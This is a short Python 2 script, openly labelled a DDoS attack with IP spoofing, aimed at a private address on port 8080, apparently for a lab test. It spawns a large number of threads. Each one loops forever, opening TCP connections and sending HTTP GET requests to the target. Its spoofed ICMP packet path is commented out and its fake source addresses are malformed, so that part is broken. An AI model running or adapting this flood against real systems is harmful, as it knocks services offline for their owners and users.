#!/usr/bin/python
import time, os, sys, string, thread, socket
from impacket import ImpactDecoder, ImpactPacket ##Using custom Python library to help with IP Spoofing

print("DDoS Attack Starting: IP Spoof Test")

#Our target's IP:
target_ip = '10.1.1.50'
port = 8080
message = "adfasdfasdfasdf"

def ddos(src, dst):
	# create our ImpactPacket 
	ip = ImpactPacket.IP()
	# Set up our own src/dst 
	ip.set_ip_src(src)
	ip.set_ip_dst(dst)

	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHO)
	 
	# Include a 128 character long payload inside the ICMP packet.
	icmp.contains(ImpactPacket.Data("O"*128))
	 
	# Have the IP packet contain the ICMP packet (along with its payload).
	ip.contains(icmp)

	seq_id = 0
	while 1:
		# Give the ICMP packet the next ID in the sequence.
		seq_id += 1
		icmp.set_icmp_id(seq_id)
		# Calculate its checksum.
		icmp.set_icmp_cksum(0)
		icmp.auto_checksum = 1            
	   # send packet
		#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		#s.connect((dst, port))
		#s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ddos.connect((dst, port))
		ddos.send("GET /%s HTTP/1.1\r\n" % message)
		# Send it to the target host.
		#s.sendto(ip.get_packet(), (dst, 8080))
		print "sent from %s of sid: %d" % (src,seq_id)
		continue

# Randomizing IP Values
for j in range(256):
	src1 = "192.01." + str(j)
	for i in range(256):
	        src = src1 + "." + str(i)
	        thread.start_new_thread(ddos, (src, target_ip))
	        time.sleep(0.2)